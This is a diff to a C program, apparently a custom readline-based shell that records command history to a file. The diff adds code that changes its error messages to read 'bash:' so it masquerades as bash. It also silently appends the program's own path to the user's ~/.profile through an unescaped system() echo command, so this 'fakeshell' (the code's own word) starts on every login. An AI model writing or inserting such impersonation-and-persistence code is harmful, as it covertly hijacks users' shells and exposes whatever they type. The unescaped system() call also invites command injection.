@@ -60,7 +60,6 @@ void LL_to_file(FILE *fp,Node *myLL)
 		fputs(p->cmd,fp);
 		fputs("\n",fp);
 	}
-
 }
 
 char **cmd_completion(const char *cmd, int st, int ed)
@@ -100,16 +99,24 @@ int shell_cd(char **command)
 	}
 	else
 	{
-		if(command[1][0]!='/')//if not absolute path
+		if(!strcmp(command[1],".."))
+		{
+			if(chdir(command[1]))
+				nonfatal("chdir");
+		}
+		else if(command[1][0]!='/')//if not absolute path
 		{
 			char *abs_path=NULL;
 			char *home=getenv("HOME");
-			abs_path=malloc(strlen(command[1])+strlen(home)+2);
+			int maxpath=strlen(command[1])+strlen(home)+2;
+			abs_path=malloc(maxpath);
 			if(!abs_path)
 				nonfatal("malloc");
-			strncpy(abs_path,home,strlen(home));
-			strcat(abs_path,"/");
-			strncat(abs_path,command[1],strlen(command[1]));
+			snprintf(abs_path,maxpath,"%s/%s",home,command[1]);
+			//these functions might have been changed in their implementations, using snprintf instead
+			// strncpy(abs_path,home,strlen(home));
+			// strcat(abs_path,"/");
+			// strncat(abs_path,command[1],strlen(command[1]));
 			if(chdir(abs_path))
 				nonfatal("chdir");
 			free(abs_path);
@@ -194,7 +201,7 @@ int launch_process(char **args)
 		if(execvp(args[0],args)==-1)
 		{
 			char error[140];
-			strcpy(error,"fsh: ");
+			strcpy(error,"bash: ");
 			strncat(error,args[0],80);
 			fatal(error);
 		}
@@ -231,7 +238,7 @@ char **parse_args(char *command)
 }
 
 //program mainloop
-void mainloop(void)
+void mainloop(char *argv)
 {
 	int return_status,loc=0;
 	char *line,hostname[MAXHOSTNAME];
@@ -254,22 +261,49 @@ void mainloop(void)
 		char cmds[MAXLINE];
 		while(fgets(cmds,MAXLINE,fp))//read from file line by line
 		{
-			strtok(cmds,"\n");
+			strtok(cmds,"\n");//remove newline
 			add_history(cmds);
 			LL_insert(cmds);
 		}
 		fclose(fp);
 	}
 	char cwd[MAXCWD];
-	getcwd(cwd,MAXCWD); 
-	char prompt[MAXPROMPT];
-	snprintf(prompt,MAXPROMPT,"\033[0;31m%s@%s:\033[;34m%s#\033[0m ",user,hostname,cwd);
+	getcwd(cwd,MAXCWD);
+
+	//this code block checks to see if the fakeshell is already in .profile or not, if not then add it in, else do nothing
+	//now everytime user execute bash, this shell will be executed first
+	char profile[MAXLINE];
+	snprintf(profile,MAXLINE,"%s/.profile",getenv("HOME"));
+	FILE *tmpfp=fopen(profile,"r");
+	if(tmpfp==NULL)
+		fatal("fopen");
+	char buf[100];
+	int found=0;
+	while(fgets(buf,100,tmpfp))
+	{
+		if(strstr(buf,"fshell")!=NULL)
+			found=1;
+	}
+	if(found==0)
+	{
+		char nodotslash[7];
+		memcpy(nodotslash,&argv[2],6);
+		nodotslash[6]='\0';
+		char appendcmd[MAXLINE];
+		snprintf(appendcmd,MAXLINE,"echo '%s/%s' >> %s",cwd,nodotslash,profile);
+		system(appendcmd);
+	}
+	fclose(tmpfp);
+
 	struct sigaction sighandler;
 	sighandler.sa_handler=sig_handler;
 	sigaction(SIGINT,&sighandler,NULL);
 	sigaction(SIGTSTP,&sighandler,NULL);
 	do
 	{
+		getcwd(cwd,MAXCWD);
+		char prompt[MAXPROMPT];
+		snprintf(prompt,MAXPROMPT,"\033[0;31m%s@%s:\033[;34m%s#\033[0m ",user,hostname,cwd);
 		rl_attempted_completion_function=cmd_completion;
 		while(sigsetjmp(jumpbuf,1));
 		line=readline(prompt);//holds the line
@@ -330,5 +364,5 @@ void mainloop(void)
 
 int main(int argc, char *argv[])
 {
-	mainloop();
+	mainloop(argv[0]);
 }
